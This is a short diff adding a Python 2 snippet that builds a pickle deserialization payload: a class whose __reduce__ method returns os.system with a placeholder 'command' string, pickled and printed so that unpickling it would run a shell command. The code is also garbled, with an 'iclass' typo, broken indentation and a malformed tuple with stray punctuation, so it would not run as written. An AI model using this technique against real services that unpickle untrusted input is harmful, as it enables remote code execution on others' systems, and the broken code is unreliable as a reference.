@@ -1,0 +1,10 @@
+import cPickle
+import os
+        
+        iclass Blah(object):
+          def __reduce__(self):
+            return (os.system,('command'.))'
+        
+        
+        b = Blah()
+        print cPickle.dumps(b)
